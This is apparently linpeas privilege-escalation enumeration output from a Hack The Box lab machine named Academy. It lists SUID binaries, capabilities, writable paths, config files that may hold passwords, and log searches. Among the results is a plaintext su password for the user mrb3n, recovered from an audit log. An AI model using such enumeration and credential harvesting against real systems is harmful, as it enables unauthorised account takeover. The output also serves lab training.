-rwsr-xr-x 1 root   root            128K Oct  8 07:30 /usr/lib/snapd/snap-confine

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                
-rwsr-sr-x 1 daemon daemon   55K Nov 12  2018 /usr/bin/at                                                                                                                                                    
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /snap/core18/1705/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   34K Feb 27  2019 /snap/core18/1705/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root   crontab 355K Mar  4  2019 /snap/core18/1705/usr/bin/ssh-agent
-rwxr-sr-x 1 root   shadow   23K Mar 22  2019 /snap/core18/1705/usr/bin/expiry
-rwxr-sr-x 1 root   shadow   71K Mar 22  2019 /snap/core18/1705/usr/bin/chage
-rwxr-sr-x 1 root   mlocate  47K Jul 16  2019 /usr/bin/mlocate
-rwxr-sr-x 1 root   utmp     15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root   tty      31K Jan  8  2020 /snap/core18/1705/usr/bin/wall
-rwxr-sr-x 1 root   crontab  43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root   tty      15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root   shadow   31K May 28 06:37 /usr/bin/expiry
-rwxr-sr-x 1 root   shadow   83K May 28 06:37 /usr/bin/chage
-rwxr-sr-x 1 root   ssh     343K May 29 07:37 /usr/bin/ssh-agent
-rwxr-sr-x 1 root   tty      35K Jul 21 07:49 /usr/bin/wall
-rwxr-sr-x 1 root   shadow   43K Jul 21 23:30 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root   shadow   43K Jul 21 23:30 /usr/sbin/pam_extrausers_chkpwd

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                                                                        
/etc/ld.so.conf                                                                                                                                                                                              
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                 
Current capabilities:                                                                                                                                                                                        
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                 
                                                                                                                                                                                                             
[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                                                                         
files with acls in searched folders Not Found                                                                                                                                                                
                                                                                                                                                                                                             
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                                                      
/usr/bin/gettext.sh                                                                                                                                                                                          
/usr/bin/rescan-scsi-bus.sh

[+] Unexpected folders in root
/lost+found                                                                                                                                                                                                  

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                                                               
total 36                                                                                                                                                                                                     
drwxr-xr-x  2 root root 4096 Nov  5 12:55 .
drwxr-xr-x 98 root root 4096 Nov  5 12:55 ..
-rw-r--r--  1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--  1 root root  833 Oct  8 07:30 apps-bin-path.sh
-rw-r--r--  1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--  1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--  1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--  1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--  1 root root 1557 Feb 17  2020 Z97-byobu.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                 
                                                                                                                                                                                                             
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No                                                                                                                                                                
[+] Credentials in fstab/mtab? ........... No                                                                                                                                                                
[+] Can I read shadow files? ............. No                                                                                                                                                                
[+] Can I read opasswd file? ............. No                                                                                                                                                                
[+] Can I write in network-scripts? ...... No                                                                                                                                                                
[+] Can I read root folder? .............. No                                                                                                                                                                
                                                                                                                                                                                                             
[+] Searching root files in home dirs (limit 30)
/home                                                                                                                                                                                                        
/home/egre55/.bash_history
/home/cry0l1t3/.bash_history
/home/mrb3n/.bash_history

[+] Searching folders owned by me containing others files on it
                                                                                                                                                                                                             
[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 2748 Sep 14 20:58 /var/log/apt/term.log.2.gz                                                                                                                                           
-rw-r----- 1 root adm 10682 Aug 12 02:18 /var/log/apt/term.log.3.gz
-rw-r----- 1 root adm 4726 Nov  5 12:55 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 2958 Nov 16 19:31 /var/log/apt/term.log
-r--r----- 1 root adm 8388720 Sep  4 03:45 /var/log/audit/audit.log.2
-rw-r----- 1 root adm 82726 Nov 16 19:55 /var/log/audit/audit.log
-r--r----- 1 root adm 8388617 Aug 23 21:45 /var/log/audit/audit.log.3
-r--r----- 1 root adm 8388813 Nov  9 10:11 /var/log/audit/audit.log.1
-rw-r----- 1 root adm 759 Oct 21 09:46 /var/log/apache2/error.log.5.gz
-rw-r----- 1 root adm 336 Sep 11 00:00 /var/log/apache2/error.log.9.gz
-rw-r----- 1 root adm 412 Nov  9 10:11 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 6748 Aug  9 23:51 /var/log/apache2/access.log.7.gz
-rw-r----- 1 root adm 2472 Aug 11 01:06 /var/log/apache2/access.log.5.gz
-rw-r----- 1 root adm 388 Nov 16 19:49 /var/log/apache2/access.log
-rw-r----- 1 root adm 0 Aug  7 14:30 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 304254 Nov  5 12:56 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 1161 Nov 16 19:17 /var/log/apache2/error.log
-rw-r----- 1 root adm 2902 Aug 10 23:30 /var/log/apache2/access.log.6.gz
-rw-r----- 1 root adm 337 Sep  8 00:00 /var/log/apache2/error.log.12.gz
-rw-r----- 1 root adm 336 Sep  7 00:00 /var/log/apache2/error.log.13.gz
-rw-r----- 1 root adm 275 Oct 21 10:57 /var/log/apache2/error.log.4.gz
-rw-r----- 1 root adm 8042 Aug 12 21:55 /var/log/apache2/access.log.4.gz
-rw-r----- 1 root adm 343 Nov  9 10:14 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 366 Nov  5 14:19 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 2087 Aug 13 13:56 /var/log/apache2/access.log.3.gz
-rw-r----- 1 root adm 336 Sep 10 00:00 /var/log/apache2/error.log.10.gz
-rw-r----- 1 root adm 337 Sep 14 00:00 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 7665 Sep 14 22:59 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 335 Sep 12 00:00 /var/log/apache2/error.log.8.gz
-rw-r----- 1 root adm 338 Sep  9 00:00 /var/log/apache2/error.log.11.gz
-rw-r----- 1 root adm 644 Aug  8 22:35 /var/log/apache2/access.log.8.gz
-rw-r----- 1 root adm 335 Sep 13 00:00 /var/log/apache2/error.log.7.gz
-rw-r----- 1 root adm 334 Sep  6 00:00 /var/log/apache2/error.log.14.gz

[+] Modified interesting files in the last 5mins (limit 100)
/home/cry0l1t3/.gnupg/pubring.kbx                                                                                                                                                                            
/home/cry0l1t3/.gnupg/crls.d/DIR.txt
/home/cry0l1t3/.gnupg/trustdb.gpg
/home/cry0l1t3/snap/lxd/14804/.config/lxc/config.yml
/var/log/kern.log
/var/log/syslog
/var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/user-1002.journal
/var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal
/var/log/audit/audit.log
/var/log/auth.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                                                                       
logrotate 3.14.0                                                                                                                                                                                             

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

[+] Files inside /home/cry0l1t3 (limit 20)
total 332                                                                                                                                                                                                    
drwxr-xr-x 6 cry0l1t3 cry0l1t3   4096 Nov 16 19:52 .
drwxr-xr-x 8 root     root       4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root     root          9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3   3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3   4096 Aug 12 21:58 .cache
drwx------ 4 cry0l1t3 cry0l1t3   4096 Nov 16 19:55 .gnupg
-rwxr-xr-x 1 cry0l1t3 cry0l1t3 297851 Nov 16 19:42 linpeas.sh
drwxrwxr-x 3 cry0l1t3 cry0l1t3   4096 Aug 12 02:30 .local
-rw-r--r-- 1 cry0l1t3 cry0l1t3    807 Feb 25  2020 .profile
drwxr-xr-x 3 cry0l1t3 cry0l1t3   4096 Nov 16 19:52 snap
-r--r----- 1 cry0l1t3 cry0l1t3     33 Nov 16 18:55 user.txt

[+] Files inside others home (limit 20)
/home/ch4p/.profile                                                                                                                                                                                          
/home/ch4p/.bashrc
/home/ch4p/.bash_logout
/home/egre55/.profile
/home/egre55/.bashrc
/home/egre55/.bash_logout
/home/egre55/.sudo_as_admin_successful
/home/g0blin/.profile
/home/g0blin/.bashrc
/home/g0blin/.bash_logout
/home/21y4d/.profile
/home/21y4d/.bashrc
/home/21y4d/.bash_logout
/home/mrb3n/.cache/composer/.htaccess
/home/mrb3n/.cache/motd.legal-displayed
/home/mrb3n/.profile
/home/mrb3n/.config/composer/.htaccess
/home/mrb3n/.bashrc
/home/mrb3n/.local/share/composer/.htaccess
/home/mrb3n/.bash_logout

[+] Searching installed mail applications
                                                                                                                                                                                                             
[+] Mails (limit 50)
                                                                                                                                                                                                             
[+] Backup files?
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old                                                                                                                                    
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-52/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 0 Oct 15 10:28 /usr/src/linux-headers-5.4.0-52-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Oct 15 10:28 /usr/src/linux-headers-5.4.0-52-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237818 Oct 15 10:28 /usr/src/linux-headers-5.4.0-52-generic/.config.old
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-47/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 0 Sep  4 19:08 /usr/src/linux-headers-5.4.0-47-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Sep  4 19:08 /usr/src/linux-headers-5.4.0-47-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237780 Sep  4 19:08 /usr/src/linux-headers-5.4.0-47-generic/.config.old
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 11886 Nov  5 12:55 /usr/share/info/dir.old
-rw-r--r-- 1 root root 44048 Jun 22 06:40 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 8169 Oct 15 10:28 /usr/lib/modules/5.4.0-52-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8737 Oct 15 10:28 /usr/lib/modules/5.4.0-52-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8161 Sep  4 19:08 /usr/lib/modules/5.4.0-47-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8729 Sep  4 19:08 /usr/lib/modules/5.4.0-47-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 1775 Aug 17 21:41 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1403 Nov  5 12:54 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 39448 Oct 22 13:19 /usr/lib/mysql/plugin/component_mysqlbackup.so
-rw-r--r-- 1 root root 3578 Nov  5 11:35 /var/www/html/academy/public/Modules_files/insight.old.min.js.download
-rw-r--r-- 1 root root 171 Nov 16 18:54 /run/blkid/blkid.tab.old

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001                                                                                                
Found: /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission
Found: /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001
Found: /var/www/html/academy/vendor/psy/psysh/test/fixtures/default/.local/share/psysh/php_manual.sqlite: empty
Found: /var/www/html/academy/vendor/psy/psysh/test/fixtures/legacy/.psysh/php_manual.sqlite: empty
Found: /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/default/.local/share/psysh/php_manual.sqlite: empty
Found: /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/legacy/.psysh/php_manual.sqlite: empty
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
                                                                                                                                                                                                             
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                                                                                                                                             
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                                                                                                             
 -> Extracting tables from /var/www/html/academy/vendor/psy/psysh/test/fixtures/default/.local/share/psysh/php_manual.sqlite (limit 20)
 -> Extracting tables from /var/www/html/academy/vendor/psy/psysh/test/fixtures/legacy/.psysh/php_manual.sqlite (limit 20)                                                                                   
 -> Extracting tables from /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/default/.local/share/psysh/php_manual.sqlite (limit 20)                                                           
 -> Extracting tables from /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/legacy/.psysh/php_manual.sqlite (limit 20)                                                                        
                                                                                                                                                                                                             
[+] Web files?(output limit)
/var/www/:                                                                                                                                                                                                   
total 12K
drwxr-xr-x  3 root root 4.0K Aug  7 14:30 .
drwxr-xr-x 14 root root 4.0K Aug  7 14:30 ..
drwxr-xr-x  4 root root 4.0K Aug 13 12:36 html

/var/www/html:
total 20K
drwxr-xr-x  4 root     root     4.0K Aug 13 12:36 .
drwxr-xr-x  3 root     root     4.0K Aug  7 14:30 ..

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                                                          
-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc                                                                                                                                                    
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 root root 3106 Aug 14  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 www-data www-data 0 Dec  6  2019 /var/www/html/academy/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history
Searching possible passwords inside /var/www/html/academy/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history (limit 100)
                                                                                                                                                                                                             
-rw-r--r-- 1 www-data www-data 0 Dec  6  2019 /var/www/html/academy/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history
Searching possible passwords inside /var/www/html/academy/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history (limit 100)
                                                                                                                                                                                                             
-rw-r--r-- 1 root root 0 Dec  6  2019 /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history
Searching possible passwords inside /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history (limit 100)
                                                                                                                                                                                                             
-rw-r--r-- 1 root root 0 Dec  6  2019 /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history
Searching possible passwords inside /var/www/html/htb-academy-dev-01/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history (limit 100)
                                                                                                                                                                                                             
-rw-r--r-- 1 root root 3106 Aug 14  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
                                                                                                                                                                                                             
[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.1.gz                                                                                                                                  
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.6.gz
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 36169 Nov  5 12:53 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.6.gz
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.5.gz
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 3951 Aug  8 22:22 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.4.gz
-rw-r--r-- 1 root root 171 Aug  7 14:33 /var/backups/dpkg.statoverride.4.gz
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.5.gz
-rw-r--r-- 1 root root 3956 Aug 12 02:18 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 643049 Aug 12 02:18 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.5.gz
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.6.gz
-rw-r--r-- 1 root root 139 Aug  7 12:07 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 268 Aug  7 12:07 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 51200 Aug 13 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 207 Aug  7 14:33 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 164463 Aug 12 02:18 /var/backups/dpkg.status.4.gz
-rw-r--r-- 1 root root 3984 Sep 14 20:56 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 3941 Aug  8 19:03 /var/backups/apt.extended_states.4.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                               
/dev/mqueue                                                                                                                                                                                                  
/dev/shm
/home/cry0l1t3
/run/lock
/run/screen
/run/screen/S-cry0l1t3
/run/user/1002
/run/user/1002/dbus-1
/run/user/1002/dbus-1/services
/run/user/1002/gnupg
/run/user/1002/inaccessible
/run/user/1002/systemd
/run/user/1002/systemd/units
/snap/core18/1705/run/lock
/snap/core18/1705/tmp
/snap/core18/1705/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1002
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory
/var/crash
/var/lib/php/sessions
/var/tmp

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                               
  Group cry0l1t3:                                                                                                                                                                                            
                                                                                                                                                                                                             
  Group adm:
                                                                                                                                                                                                             

[+] Searching passwords in config PHP files
/var/www/html/academy/config/database.php                                                                                                                                                                    
/var/www/html/htb-academy-dev-01/config/database.php

[+] Checking for TTY (sudo/su) passwords in logs
Error opening config file (Permission denied)                                                                                                                                                                
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A

[+] Finding IPs inside logs (limit 70)
   1351 /var/log/apache2/access.log.1:10.10.14.6                                                                                                                                                             
     74 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-0000000000253e21-0005af2e7688dcc2.journal:10.10.14.2
     70 /var/log/audit/audit.log.3:10.10.14.4
     68 /var/log/audit/audit.log.1:10.10.14.2
     62 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal:10.10.14.6
     55 /var/log/audit/audit.log.1:10.10.14.6
     38 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal:10.10.14.38
     36 /var/log/audit/audit.log.3:10.10.14.2
     26 /var/log/audit/audit.log:10.10.14.38
     19 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal:10.10.14.5
     16 /var/log/wtmp:10.10.14.2
     16 /var/log/audit/audit.log.1:10.10.14.5
     11 /var/log/auth.log:10.10.14.38
      9 /var/log/bootstrap.log:1.3.4.202
      6 /var/log/auth.log.1:10.10.14.6
      5 /var/log/wtmp:10.10.14.3
      4 /var/log/wtmp:10.10.14.4
      3 /var/log/wtmp:10.10.14.6
      2 /var/log/apache2/access.log:10.10.14.38
      1 /var/log/wtmp:10.10.14.5
      1 /var/log/wtmp:10.10.14.38
      1 /var/log/lastlog:10.10.14.6
      1 /var/log/lastlog:10.10.14.5
      1 /var/log/lastlog:10.10.14.38
      1 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal:91.189.89.198
      1 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-0000000000253e21-0005af2e7688dcc2.journal:91.189.94.4
      1 /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system@57332d48f1de478cb8be0519ec020dd4-0000000000253e21-0005af2e7688dcc2.journal:91.189.89.198
      1 /var/log/installer/subiquity-debug.log.1758:127.255.255.255
      1 /var/log/installer/subiquity-debug.log:127.255.255.255

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/auth.log.3.gz matches                                                                                                                                                                   
Binary file /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/system.journal matches
Binary file /var/log/journal/28c7c847c4f94b33842e7c53dc6e7741/user-1002.journal matches
/var/log/auth.log.1:Nov  5 11:38:28 academy sshd[1159]: Failed password for root from 10.10.14.6 port 39788 ssh2
/var/log/auth.log.1:Nov  5 11:38:40 academy sshd[1172]: Accepted password for egre55 from 10.10.14.6 port 39790 ssh2
/var/log/auth.log.1:Nov  5 11:41:46 academy sudo:   egre55 : TTY=pts/0 ; PWD=/home/egre55 ; USER=root ; COMMAND=/bin/bash
/var/log/auth.log.1:Nov  5 11:43:32 academy sshd[1604]: Accepted password for egre55 from 10.10.14.6 port 34400 ssh2
/var/log/auth.log.1:Nov  5 11:43:40 academy sudo:   egre55 : TTY=pts/1 ; PWD=/home/egre55 ; USER=root ; COMMAND=/bin/bash
/var/log/auth.log.1:Nov  6 09:52:42 academy sshd[1117]: Accepted password for egre55 from 10.10.14.6 port 36016 ssh2
/var/log/auth.log.1:Nov  6 09:52:48 academy sudo:   egre55 : TTY=pts/0 ; PWD=/home/egre55 ; USER=root ; COMMAND=/bin/bash
/var/log/auth.log:Nov 16 18:54:54 academy VGAuth[630]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Nov 16 18:54:59 academy VGAuth[630]: message repeated 4 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
/var/log/auth.log:Nov 16 18:55:00 academy VGAuth[630]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Nov 16 18:55:01 academy VGAuth[630]: message repeated 9 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
/var/log/auth.log:Nov 16 18:55:06 academy VGAuth[630]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Nov 16 18:55:07 academy VGAuth[630]: message repeated 8 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
/var/log/auth.log:Nov 16 19:11:36 academy sshd[1679]: Failed password for invalid user dev from 10.10.14.38 port 56982 ssh2
/var/log/auth.log:Nov 16 19:12:47 academy sshd[1722]: Failed password for invalid user dev from 10.10.14.38 port 56988 ssh2
/var/log/auth.log:Nov 16 19:27:50 academy sshd[2127]: Accepted password for cry0l1t3 from 10.10.14.38 port 57018 ssh2
/var/log/auth.log:Nov 16 19:55:11 academy sudo: cry0l1t3 : command not allowed ; TTY=pts/0 ; PWD=/home/cry0l1t3 ; USER=root ; COMMAND=list
/var/log/auth.log:Nov 16 19:55:11 academy sudo: pam_unix(sudo:auth): auth could not identify password for [cry0l1t3]
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.47_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.8.1-1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.47) ...
/var/log/bootstrap.log:Setting up passwd (1:4.8.1-1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) over (3.5.47) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.8.1-1ubuntu5) ...
/var/log/cloud-init.log:2020-08-07 12:12:41,564 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2020-08-07 12:12:41,598 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
/var/log/cloud-init.log:2020-08-07 14:24:37,872 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dmesg.0:[    5.332900] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg.0:[    6.033245] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
/var/log/dmesg.0:[    6.039154] systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
/var/log/dmesg:[    5.252853] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Aug 07 12:02:26 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
/var/log/installer/installer-journal.txt:Aug 07 12:02:26 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
